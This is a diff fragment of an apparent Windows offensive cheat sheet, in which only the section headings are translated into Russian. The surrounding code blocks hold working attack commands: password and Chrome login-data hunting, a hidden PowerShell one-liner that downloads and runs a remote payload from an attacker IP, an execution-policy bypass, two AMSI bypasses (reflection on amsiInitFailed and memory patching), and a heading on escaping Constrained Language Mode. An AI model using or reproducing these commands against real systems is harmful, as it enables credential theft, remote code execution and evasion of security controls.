@@ -363,7 +363,7 @@ findstr /si password C:\Windows\system32\sysprep.inf
 PowerShell: Get-ChildItem -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
 ```
 
-PowerShell execution policy bypass flags
+Флаги обхода политики выполнения PowerShell (execution policy bypass).
 
 ```
 # Execution policy bypass:
@@ -372,7 +372,7 @@ powershell -ep bypass -enc <base64>
 PowerShell.exe -nop -noni -w hidden -c "IEX (iwr http://<IP>/payload.ps1)"
 ```
 
-Classic AMSI bypass — set amsiInitFailed to true
+Классический обход AMSI — установка для `amsiInitFailed` значения `true`.
 
 ```
 # AMSI bypass (patching amsiScanBuffer in current process):
@@ -380,7 +380,7 @@ Classic AMSI bypass — set amsiInitFailed to true
   .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-AMSI memory context corruption bypass
+Обход AMSI через повреждение контекста памяти (memory context corruption).
 
 ```
 # AMSI bypass via memory patching (2023+):
@@ -390,7 +390,7 @@ $c=$b.GetValue($null)
 [Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]$c.ToInt64(),0x41414141)
 ```
 
-Check CLM mode and downgrade to PowerShell 2.0 to bypass restrictions
+Проверка режима CLM (Constrained Language Mode) и переход на PowerShell 2.0 для обхода ограничений.
 
 ```
 # Constrained Language Mode check and bypass:
